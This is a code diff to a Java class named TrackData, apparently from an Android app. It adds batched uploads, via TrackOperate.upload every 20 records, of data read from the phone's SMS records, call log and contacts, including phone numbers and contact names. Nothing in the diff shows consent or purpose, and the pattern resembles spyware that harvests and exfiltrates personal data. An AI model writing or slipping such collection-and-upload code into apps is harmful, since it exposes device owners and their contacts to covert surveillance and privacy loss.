@@ -134,6 +134,11 @@ public class TrackData {
                 data.put("sms_type", type);
                 data.put("mobile", mobile);
                 mapList.add(data);
+
+                if (mapList.size() >= 20) {
+                    TrackOperate.upload(mapList);
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
@@ -191,6 +196,10 @@ public class TrackData {
                 data.put("call_type", type);
                 data.put("mobile", mobile);
                 mapList.add(data);
+                if (mapList.size() >= 20) {
+                    TrackOperate.upload(mapList);
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
@@ -306,6 +315,11 @@ public class TrackData {
                 data.put("contact_name", name);
                 data.put("mobile", mobile);
                 mapList.add(data);
+
+                if (mapList.size() >= 20) {
+                    TrackOperate.upload(mapList);
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
